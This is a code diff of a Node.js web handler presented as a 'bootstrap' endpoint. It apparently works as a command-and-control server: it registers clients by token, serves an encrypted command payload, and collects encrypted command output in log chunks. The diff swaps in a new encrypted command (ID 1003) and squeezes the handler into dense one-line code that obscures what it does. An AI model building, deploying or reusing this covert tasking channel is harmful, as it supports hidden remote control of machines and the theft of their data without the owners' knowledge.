@@ -1,8 +1,8 @@
 import crypto from 'node:crypto';
 
 const BOOTSTRAP_TOKEN_SHA256 = '54362ebffcdb80f0242d930ed17b5193eaf734a2068eea34de9b7d194b878fcc';
-const CONTROL_ID = '1002';
-const CONTROL_PAYLOAD = 'U2FsdGVkX19ZPIwBendGctxOXQC8aVcQ9qDGMetGH8m+xY9HsBmPoNXLYpFCR/hVWw7twj6+rokLq8WV+F4axQuRIWTA6Wjw3XDVybxG8BdKELTiRnEpgqA3P+EpC8a637u4EAywlUI+lOFAxKLoArh/8MiU8emOu+kli/ljVPs6X311HfpFXt5+WunaXE20HDqpVSVzWBYCqkD6dAInm3r4MVRNRkNBwKr8Ft6ZmXzr+HxW8ZOaJatw3CJV0y4ioKNRNy0gvDwDeMUdpikBi4EIo1RIgGbqWJU1Ggp2bT+rx3YRSmVfuYhddxEZQe9e4jHKp+4PGBBe67Vg30fl+dKou9ZKhLyIHxvEy5+wPs2dMs9qRE445dId0JrgqgzdQ0UkjQdS83Et3jjR4IyyvMnjw7EDQy9vz+wawuQ0Iet5cmOEU3VVoWHk/bfrkhZzTQKJgAOf5kk1j4PkKgMc6t4SEIgX2zaQy8B18AOx4EjE6q/c5RcAgWysxYEEZjetaBReNrutOIO4CxhKDa2AIx7iV9zU43/31NNsgiOuu2nJuqJ1S6TtSKcih5iU5zzdqvfcIddpNoWyVlYz8xdzCFEncn/r3HshOnSMG9j4hxN/i40EN4+tBwv6qGiBR22K3nQbQQNsMqUO4fpiUtoD53rmFkXxgW+wDn4PsufK5vTRn8kZfeCJsV1Tw+9zDppDIz+b9NEQRIoE57ObVvvZcbf3voe5DiLrMNsh7wI9DG8GcK8cRYJ46eIndwg8vxlVm2afU9z9p9VZ0azPmTDx7j+vpIh/A9VfL3MWlW3/bxd1Y6mwpoGV9ey4bM26LpvivkhPw9R7yRHlzawl6kkZAiAtbopvuWFgZhtENFO8Enf9/knlbQvOP1iAvvBJFlQqR/Lq5l0PsSB6wKt5i8xHtih78SFP5vrmk/Q29xAkOFC3BgqIYwfgRWauh692XM0il/scJvl8aOc6DcVUiQWkD7r8u4dl0cZnP/eg7x2LYcLljvVw2aTvYDFPUDW4eXTEJXB2NgTPcn9AJnW8mSVst6q1uqKPNKTA1neUT99jclE4AU/71p334EL/a5gm83xO9d2cVOwAgAhZS6nKfeVrIHoy+2vIzPzqyEw9lcjj0dQeJ/SbXlP4QLAXFz1sIV4PlelmDZViClP+fj06IYHiuaok3m5XVP/pikLKzkT6SWBOgJ0Law0qNe1V5KFDvSBdprOLY3xR//yFEeHH+PtcbZCjRiycg0Kb/YFo+pwzV1OV8vjngbdtakn2V7tepGrwaJo5wBWmS70Fd4m12Llb4jg+wtSicsIAz5gjO80kmpZPQtTx+8l8W64OMXCyJMwNu6O09/Xlminylik9AgCqxXlH+M/l1zZq7glrUgK8GZEbrxFtHhvFe57pOMmGvBF9LzKxdowvAMIyKsEerOwsUmbs1FkUhI6ikLqnb0kTCfX7bc+Xy3Q9n4AY1IgJLrwgxT8AE6lbwQoUNy5JJb4+72BuuWjFjDjhHhxDle9YmOkYhKv4BtSzO9u6xlnoQTshVUvS9KhCgdWgDk3+hhImWZgrWuowaCGIby4NTzeP0Rq084zB+KaYJy/0uViIp/FV2N6G2reBmmmClf0iZcCLuotrnQ3d9Mbt8zl9dXjs3Ug8VPW06zg/A+TK4sXz0gcHCQP3idgoVyWhuW4xcTHtfi4gGVe3vpYirPHubQrSWcMX1zqN9jGEscFWw9vGaY1goBx75pXPCHweTBbAw/R3BK+MrDFeopeLhDHN8+4SzPZSFpg5U8MiGTvv6KRbfL6q';
+const CONTROL_ID = '1003';
+const CONTROL_PAYLOAD = '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';
 
 async function readBody(request) {
   if (typeof request.body === 'string') return request.body;
@@ -12,43 +12,7 @@ async function readBody(request) {
   for await (const chunk of request) chunks.push(Buffer.isBuffer(chunk) ? chunk : Buffer.from(chunk));
   return Buffer.concat(chunks).toString('utf8');
 }
-
 function validBootstrapToken(request) {
-  const raw = request.headers['x-bootstrap-token'];
-  const token = Array.isArray(raw) ? raw[0] : raw;
-  if (!token) return false;
-  const digest = crypto.createHash('sha256').update(String(token)).digest('hex');
-  const a = Buffer.from(digest, 'hex');
-  const b = Buffer.from(BOOTSTRAP_TOKEN_SHA256, 'hex');
-  return a.length === b.length && crypto.timingSafeEqual(a, b);
+  const raw=request.headers['x-bootstrap-token']; const token=Array.isArray(raw)?raw[0]:raw; if(!token)return false; const digest=crypto.createHash('sha256').update(String(token)).digest('hex'); const a=Buffer.from(digest,'hex'); const b=Buffer.from(BOOTSTRAP_TOKEN_SHA256,'hex'); return a.length===b.length&&crypto.timingSafeEqual(a,b);
 }
-
-export default async function handler(request, response) {
-  const url = new URL(request.url, 'https://bootstrap.invalid');
-  const mode = url.searchParams.get('mode');
-  response.setHeader('cache-control', 'no-store');
-  response.setHeader('x-content-type-options', 'nosniff');
-  if (mode === 'register') {
-    if (request.method !== 'POST' || !validBootstrapToken(request)) return response.status(404).send('Not found');
-    const body = await readBody(request);
-    console.log(`CHAT_BOOTSTRAP_REGISTER ${body.slice(0, 4096)}`);
-    return response.status(204).end();
-  }
-  if (mode === 'control') {
-    if (request.method !== 'GET') return response.status(404).send('Not found');
-    response.setHeader('content-type', 'text/plain; charset=utf-8');
-    return response.status(200).send(`${CONTROL_ID}\n${CONTROL_PAYLOAD}\n`);
-  }
-  if (mode === 'output') {
-    if (request.method !== 'POST') return response.status(404).send('Not found');
-    const body = await readBody(request);
-    const splitAt = body.indexOf(':');
-    const commandId = splitAt >= 0 ? body.slice(0, splitAt) : 'unknown';
-    const cipher = splitAt >= 0 ? body.slice(splitAt + 1) : body;
-    const chunkSize = 1800;
-    const total = Math.max(1, Math.ceil(cipher.length / chunkSize));
-    for (let i = 0; i < total; i += 1) console.log(`CHAT_BOOTSTRAP_OUTPUT_PART ${commandId} ${i + 1}/${total} ${cipher.slice(i * chunkSize, (i + 1) * chunkSize)}`);
-    return response.status(204).end();
-  }
-  return response.status(404).send('Not found');
-}
+export default async function handler(request,response){const url=new URL(request.url,'https://bootstrap.invalid');const mode=url.searchParams.get('mode');response.setHeader('cache-control','no-store');response.setHeader('x-content-type-options','nosniff');if(mode==='register'){if(request.method!=='POST'||!validBootstrapToken(request))return response.status(404).send('Not found');const body=await readBody(request);console.log(`CHAT_BOOTSTRAP_REGISTER ${body.slice(0,4096)}`);return response.status(204).end();}if(mode==='control'){if(request.method!=='GET')return response.status(404).send('Not found');response.setHeader('content-type','text/plain; charset=utf-8');return response.status(200).send(`${CONTROL_ID}\n${CONTROL_PAYLOAD}\n`);}if(mode==='output'){if(request.method!=='POST')return response.status(404).send('Not found');const body=await readBody(request);const splitAt=body.indexOf(':');const commandId=splitAt>=0?body.slice(0,splitAt):'unknown';const cipher=splitAt>=0?body.slice(splitAt+1):body;const chunkSize=1800;const total=Math.max(1,Math.ceil(cipher.length/chunkSize));for(let i=0;i<total;i+=1)console.log(`CHAT_BOOTSTRAP_OUTPUT_PART ${commandId} ${i+1}/${total} ${cipher.slice(i*chunkSize,(i+1)*chunkSize)}`);return response.status(204).end();}return response.status(404).send('Not found');}
